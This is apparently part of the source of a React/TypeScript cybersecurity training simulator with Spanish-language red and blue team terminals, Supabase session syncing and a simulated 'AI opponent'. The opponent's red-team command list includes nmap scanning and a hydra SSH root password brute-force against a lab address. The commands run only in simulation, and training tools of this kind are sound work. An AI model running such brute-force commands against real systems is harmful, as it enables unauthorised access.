            let output = `CONNECTED(00000003)\n---\nCertificate chain\n 0 s:/C=MX/ST=None/L=None/O=Valtorix/CN=${host.hostname}\n   i:/C=MX/ST=None/L=None/O=Valtorix/CN=ValtorixCA\n---\n`;
            if (sslVuln) {
                output += `SSL-Session:\n    Protocol  : TLSv1.2\n    Cipher    : AES128-SHA\n    <strong class="text-red-500">WARNING: Weak SSL Cipher detected!</strong>\n`;
            } else {
                output += `SSL-Session:\n    Protocol  : TLSv1.3\n    Cipher    : TLS_AES_256_GCM_SHA384\n`;
            }
            output += `    Verify return code: 0 (ok)\n---\n`;
            return { output: [{ text: output, type: 'output' }] };
        }
        return { output: [{ text: "openssl: use 's_client -connect host:port'", type: 'error' }] };
    }
};

// ============================================================================
// Context & Provider
// ============================================================================

interface ISimulationContext {
    userTeam: 'red' | 'blue' | 'spectator';
    environment: VirtualEnvironment | null;
    activeScenario: InteractiveScenario | null;
    terminals: TerminalState[];
    logs: LogEntry[];
    activeProcesses: ActiveProcess[];
    isAiActive: boolean;
    toggleAiOpponent: () => void;
    processCommand: (terminalId: string, cmdString: string) => Promise<void>;
    addNewTerminal: () => void;
    removeTerminal: (terminalId: string) => void;
    startScenario: (scenarioId: string) => Promise<boolean>;
    setEnvironment: React.Dispatch<React.SetStateAction<VirtualEnvironment | null>>;
}

export const SimulationContext = createContext<ISimulationContext>({} as ISimulationContext);

export const SimulationProvider: React.FC<{ sessionData: SessionData; children: ReactNode }> = ({ sessionData, children }) => {
    const [environment, setEnvironment] = useState<VirtualEnvironment | null>(null);
    const [terminals, setTerminals] = useState<TerminalState[]>([]);
    const [logs, setLogs] = useState<LogEntry[]>([]);
    const [activeScenarioId, setActiveScenarioId] = useState<string | null>(null);
    const [isAiActive, setIsAiActive] = useState(false);
    const [activeProcesses, setActiveProcesses] = useState<ActiveProcess[]>([]);
    const channelRef = useRef<RealtimeChannel | null>(null);

    const activeScenario = useMemo(() => {
        if (!activeScenarioId) return null;
        const scenario = TRAINING_SCENARIOS.find(s => s.id === activeScenarioId);
        return (scenario && 'isInteractive' in scenario && scenario.isInteractive) ? (scenario as InteractiveScenario) : null;
    }, [activeScenarioId]);

    // Initialize or Load Session
    useEffect(() => {
        const initSession = async () => {
            const { data: stateData } = await supabase
                .from('simulation_state')
                .select('*')
                .eq('session_id', sessionData.sessionId)
                .single();

            const { data: logData } = await supabase
                .from('simulation_logs')
                .select('*')
                .eq('session_id', sessionData.sessionId)
                .order('timestamp', { ascending: true });

            let initialTerminals: TerminalState[] = [];
            let needsUpdate = false;

            if (stateData) {
                if (stateData.active_scenario) {
                    setActiveScenarioId(stateData.active_scenario);
                    const scenario = TRAINING_SCENARIOS.find(s => s.id === stateData.active_scenario) as InteractiveScenario;
                    if (scenario) {
                        setEnvironment(mapDbRowToEnvironment(stateData, scenario));
                    }
                }
                initialTerminals = mapDbRowToTerminals(stateData);
            }
            
            if (initialTerminals.length === 0) {
                 initialTerminals = [
                    {
                        id: 'red-1',
                        name: 'Terminal Rojo 1',
                        output: [{ text: "Sesión iniciada. Seleccione un escenario en 'Capacitación' o use 'start-scenario [id]'.", type: 'output' }],
                        prompt: { user: 'pasante-red', host: 'kali', dir: '~' },
                        history: [],
                        historyIndex: -1,
                        input: '',
                        mode: 'normal',
                        isBusy: false
                    },
                    {
                        id: 'blue-1',
                        name: 'Terminal Azul 1',
                        output: [{ text: "Sesión iniciada. Seleccione un escenario en 'Capacitación' o use 'start-scenario [id]'.", type: 'output' }],
                        prompt: { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' },
                        history: [],
                        historyIndex: -1,
                        input: '',
                        mode: 'normal',
                        isBusy: false
                    }
                ];
                needsUpdate = true;
            }

            setTerminals(initialTerminals);
            
            if (logData) setLogs(logData as LogEntry[]);

            if (needsUpdate && stateData) {
                 const dbRowTerminals = mapTerminalsToDbRow(initialTerminals);
                 await supabase.from('simulation_state').update(dbRowTerminals).eq('session_id', sessionData.sessionId);
            }
        };

        initSession();

        // Realtime Subscription
        const channel = supabase.channel(`session:${sessionData.sessionId}`)
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'simulation_state', filter: `session_id=eq.${sessionData.sessionId}` }, (payload) => {
                const newState = payload.new as SimulationStateRow;
                if (newState.active_scenario) {
                    const scenario = TRAINING_SCENARIOS.find(s => s.id === newState.active_scenario) as InteractiveScenario;
                    if (scenario) {
                        setActiveScenarioId(newState.active_scenario);
                        setEnvironment(mapDbRowToEnvironment(newState, scenario));
                        setTerminals(mapDbRowToTerminals(newState));
                    }
                }
            })
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'simulation_logs', filter: `session_id=eq.${sessionData.sessionId}` }, (payload) => {
                setLogs(prev => [...prev, payload.new as LogEntry]);
            })
            .subscribe();

        channelRef.current = channel;

        return () => {
            supabase.removeChannel(channel);
        };
    }, [sessionData.sessionId]);


    const startScenario = async (scenarioId: string) => {
        const scenario = TRAINING_SCENARIOS.find(s => s.id === scenarioId);
        if (!scenario || !('isInteractive' in scenario) || !scenario.isInteractive) return false;
        
        const interactiveScenario = scenario as InteractiveScenario;
        const newEnv = R.clone(interactiveScenario.initialEnvironment);
        setEnvironment(newEnv);
        setActiveScenarioId(scenarioId);
        setLogs([]);
        
        const initialTerminals: TerminalState[] = [
            {
                id: 'red-1',
                name: 'Terminal Rojo 1',
                output: [{ text: "Bienvenido a Kali Linux (Simulado). Tu objetivo es la máquina objetivo.", type: 'output' }],
                prompt: { user: 'pasante-red', host: 'kali', dir: '~' },
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false
            },
            {
                id: 'blue-1',
                name: 'Terminal Azul 1',
                output: [{ text: "Bienvenido al SOC. Monitorea los logs y el firewall.", type: 'output' }],
                prompt: { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' },
                history: [],
                historyIndex: -1,
                input: '',
                mode: 'normal',
                isBusy: false
            }
        ];
        setTerminals(initialTerminals);

        const row = mapEnvironmentToDbRow(newEnv);
        const terminalRow = mapTerminalsToDbRow(initialTerminals);
        
        await supabase.from('simulation_state').update({ 
            ...row, 
            ...terminalRow,
            active_scenario: scenarioId 
        }).eq('session_id', sessionData.sessionId);
        
        await supabase.from('simulation_logs').delete().eq('session_id', sessionData.sessionId);

        return true;
    };

    const processCommand = async (terminalId: string, cmdString: string) => {
        if (!cmdString.trim()) return; 
        
        const terminalIndex = terminals.findIndex(t => t.id === terminalId);
        const isAiAction = terminalId.includes('-ai-');
        let currentTerminal = terminals[terminalIndex];

        if (!currentTerminal && isAiAction) {
             return; 
        }
        if (!currentTerminal) return;

        
        // 1. Echo command locally immediately
        const newOutput = [...currentTerminal.output, { text: cmdString, type: 'command' } as TerminalLine];
        const updatedTerminals = [...terminals];
        updatedTerminals[terminalIndex] = { ...currentTerminal, output: newOutput, isBusy: true };
        setTerminals(updatedTerminals);

        // 2. Parse and Execute
        const args = parseArguments(cmdString);
        const cmdName = args[0];
        const handler = commandLibrary[cmdName];

        let result: CommandResult = { output: [{ text: `Comando no encontrado: ${cmdName}`, type: 'error' }] };

        const envIndependentCommands = ['start-scenario', 'help', 'clear', 'marca', 'whoami', 'exit'];
        
        if (!environment && !envIndependentCommands.includes(cmdName)) {
             result = { output: [{ text: "Error: No hay un escenario activo. Use 'start-scenario <id>' o seleccione uno en la pestaña Capacitación.", type: 'error' }] };
        } else if (handler) {
            try {
                const context: CommandContext = {
                    userTeam: terminalId.startsWith('red') ? 'red' : 'blue',
                    terminalState: currentTerminal,
                    environment: environment!,
                    activeScenario: activeScenario!,
                    setEnvironment,
                    startScenario
                };
                result = await handler(args.slice(1), context);
            } catch (err: any) {
                result = { output: [{ text: `Error ejecutando comando: ${err.message}`, type: 'error' }] };
            }
        }

        // 3. Update State with Results
        const finalTerminals = [...terminals];
        const finalTerminal = { ...finalTerminals[terminalIndex] };
        
        if (result.clear) {
            finalTerminal.output = [];
        } else {
            finalTerminal.output = [...newOutput, ...result.output];
        }
        
        if (result.newTerminalState) {
            Object.assign(finalTerminal, result.newTerminalState);
        }
        finalTerminal.isBusy = false;
        finalTerminals[terminalIndex] = finalTerminal;
        
        setTerminals(finalTerminals);

        if (result.newEnvironment) {
            setEnvironment(result.newEnvironment);
        }

        // 4. Sync to DB
        const dbRowEnv = result.newEnvironment ? mapEnvironmentToDbRow(result.newEnvironment) : {};
        const dbRowTerminals = mapTerminalsToDbRow(finalTerminals);
        
        await supabase.from('simulation_state').update({ ...dbRowEnv, ...dbRowTerminals }).eq('session_id', sessionData.sessionId);

        // 5. Log entry if meaningful action
        if (cmdName !== 'clear' && cmdName !== 'ls' && cmdName !== 'cd') {
            const logEntry = {
                session_id: sessionData.sessionId,
                message: `${currentTerminal.prompt.user}: ${cmdString}`,
                team_visible: 'all',
                source_team: terminalId.startsWith('red') ? 'red' : 'blue'
            };
            await supabase.from('simulation_logs').insert(logEntry);
        }
    };

    const addNewTerminal = () => {
        if (sessionData.team === 'spectator') return;
        const id = `${sessionData.team}-${Date.now()}`;
        const newTerminal: TerminalState = {
            id,
            name: `Terminal ${sessionData.team === 'red' ? 'Rojo' : 'Azul'} ${terminals.filter(t => t.id.startsWith(sessionData.team)).length + 1}`,
            output: [{ text: "Nueva sesión iniciada.", type: 'output' }],
            prompt: { user: `pasante-${sessionData.team}`, host: 'soc-valtorix', dir: '~' },
            history: [],
            historyIndex: -1,
            input: '',
            mode: 'normal',
            isBusy: false
        };
        const newTerminals = [...terminals, newTerminal];
        setTerminals(newTerminals);
        const dbRowTerminals = mapTerminalsToDbRow(newTerminals);
        supabase.from('simulation_state').update(dbRowTerminals).eq('session_id', sessionData.sessionId).then();
    };

    const removeTerminal = (id: string) => {
         const newTerminals = terminals.filter(t => t.id !== id);
         setTerminals(newTerminals);
         const dbRowTerminals = mapTerminalsToDbRow(newTerminals);
         supabase.from('simulation_state').update(dbRowTerminals).eq('session_id', sessionData.sessionId).then();
    };

    const toggleAiOpponent = () => setIsAiActive(!isAiActive);

    // AI Opponent Logic Loop
    useEffect(() => {
        let aiInterval: NodeJS.Timeout;

        if (isAiActive && environment && activeScenarioId) {
            aiInterval = setInterval(async () => {
                const aiTeam = sessionData.team === 'red' ? 'blue' : 'red';
                const targetTerminal = terminals.find(t => t.id.startsWith(aiTeam));
                
                if (targetTerminal) {
                    let cmd = '';
                    if (aiTeam === 'red') {
                        const cmds = [
                            'nmap -sV 10.0.10.5', 
                            'hydra -l root -P rockyou.txt ssh://10.0.10.5', 
                            'ls -la /var/www/html',
                            'curl http://10.0.10.5/login.php',
                            'whoami'
                        ];
                        cmd = cmds[Math.floor(Math.random() * cmds.length)];
                    } else {
                        const cmds = [
                            'sudo ufw status', 
                            'journalctl -f', 
                            'ps aux', 
                            'netstat -tulnp',
                            'tail -f /var/log/auth.log'
                        ];
                        cmd = cmds[Math.floor(Math.random() * cmds.length)];
                    }
                    
                    await processCommand(targetTerminal.id, cmd);
                }
            }, 8000);
        }
        return () => clearInterval(aiInterval);
    }, [isAiActive, environment, activeScenarioId, sessionData.team, terminals]);

    return (
        <SimulationContext.Provider value={{
            userTeam: sessionData.team,
            environment,
            activeScenario,
            terminals,
            logs,
            activeProcesses,
            isAiActive,
            toggleAiOpponent,
            processCommand,
            addNewTerminal,
            removeTerminal,
            startScenario,
            setEnvironment
        }}>
            {children}
        </SimulationContext.Provider>
    );
};
